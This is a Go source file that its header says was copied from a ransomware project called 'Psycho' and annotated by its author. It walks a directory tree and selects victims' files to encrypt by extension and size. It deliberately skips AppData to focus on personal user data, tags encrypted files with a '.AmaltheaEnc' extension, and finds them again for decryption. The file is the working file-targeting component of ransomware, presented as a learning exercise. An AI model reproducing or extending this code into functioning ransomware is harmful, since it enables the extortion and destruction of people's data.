package files

/*

	This file has been taken almost "word for word" from
	https://github.com/Null-byte-00/Psycho/blob/master/psycho/src/files/files.go
	The file here has been commented as proof I know what it is doing.
	Additional error handling has been added to assist debugging.

*/

import (
	"os"
	"path/filepath"
	"strings"
)

// Files describes file structure
type Files struct {
	rootDir string
	exts    []string
	size    int
}

// NewFiles Structures Object
func NewFiles(r string, e []string, s int) Files {
	f := Files{
		rootDir: r,
		exts:    e,
		size:    s,
	}
	return f
}

// ScanToEncrypt scans all valid files to encrypt
func (f *Files) ScanToEncrypt() ([]string, error) {
	// Store encryptable files as array.
	var files []string
	// Begin "walking" from `rootDir` to get all available folders & subfolders
	err := filepath.Walk(f.rootDir, func(path string, info os.FileInfo, err error) error {
		// Returns info describing a named file.
		stat, error := os.Stat(path)
		/*
			The AppData folder contains a load of files that are difficult to
			encrypt (because of permissions) and it doesn't contain much
			personal user data, so we'll skip trying to encrypt it.
		*/
		if info.IsDir() && info.Name() == "AppData" {
			return filepath.SkipDir
		}
		// If there's an error getting files, print the error.
		if error != nil {
			return error
		}
		// HasSuffix looks for already encoded files.
		if !strings.HasSuffix(path, ".AmaltheaEnc") {
			if !stat.IsDir() {
				// Checks the file is below maximum file size in bytes defined by `size`
				if stat.Size() <= int64(f.size) {
					for _, ext := range f.exts {
						if strings.Contains(path, "."+ext) {
							// Append file & file path to `files`
							files = append(files, path)
							break
						}
					}
				}
			}
		}
		return nil
	})
	// Return `files` array to use for encryption
	return files, err
}

// ScanToDecrypt scans all valid files to encrypt
func (f *Files) ScanToDecrypt() ([]string, error) {
	var files []string
	// Begin "walking" from `rootDir` to get all available folders & subfolders to decrypt
	err := filepath.Walk(f.rootDir, func(path string, info os.FileInfo, err error) error {
		stat, error := os.Stat(path)
		/*
			The AppData folder contains a load of files that are difficult to
			decrypt (because of permissions) and doesn't contain much
			personal user data, so we'll skip trying to decrypt it.
		*/
		if info.IsDir() && info.Name() == "AppData" {
			return filepath.SkipDir
		}
		// If there's an error getting files, print the error.
		if error != nil {
			return error
		}
		if !stat.IsDir() {
			// If the file has the encryption extension, add it to the array
			if strings.HasSuffix(path, ".AmaltheaEnc") {
				files = append(files, path)
			}
		}
		return nil
	})
	return files, err
}
